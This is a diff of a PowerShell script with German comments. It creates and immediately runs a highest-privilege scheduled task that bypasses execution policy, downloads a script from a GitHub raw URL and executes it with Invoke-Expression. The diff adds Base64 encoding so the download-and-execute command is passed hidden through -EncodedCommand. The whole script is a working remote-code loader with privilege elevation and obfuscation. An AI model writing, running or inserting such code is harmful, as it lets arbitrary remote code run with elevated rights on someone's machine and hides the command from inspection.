@@ -1,9 +1,13 @@
-$scriptUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/notepad"
+$scriptUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/calc"
 $taskName = "MeinErhöhterTask"
-$taskCommand = "powershell.exe -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri '$scriptUrl' -UseBasicParsing | Invoke-Expression`""
 
-# Geplante Aufgabe erstellen
-schtasks /create /tn $taskName /tr $taskCommand /sc once /st 00:00 /rl highest /f | Out-Null
+# PowerShell-Befehl in Base64 kodieren
+$command = "Invoke-WebRequest -Uri '$scriptUrl' -UseBasicParsing | Invoke-Expression"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
 
-# Aufgabe sofort ausführen
+# Erstelle die geplante Aufgabe
+schtasks /create /tn $taskName /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" /sc once /st 00:00 /rl highest /f | Out-Null
+
+# Führe die Aufgabe sofort aus
 schtasks /run /tn $taskName
